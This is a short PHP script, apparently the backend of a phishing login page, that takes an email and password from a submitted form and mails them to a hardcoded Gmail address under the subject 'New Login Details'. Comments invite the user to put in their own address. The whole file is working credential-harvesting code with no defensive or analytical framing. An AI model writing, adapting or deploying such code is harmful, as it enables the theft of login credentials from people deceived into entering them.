<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Set email details
    $to = "muddyexchange@gmail.com";  // Replace with your email
    $subject = "New Login Details";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: muddypoundx@gmail.com";  // Replace with a valid domain

    // Attempt to send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login data sent successfully!";
    } else {
        echo "Error: Unable to send login data.";
    }
} else {
    echo "Invalid request.";
}
?>
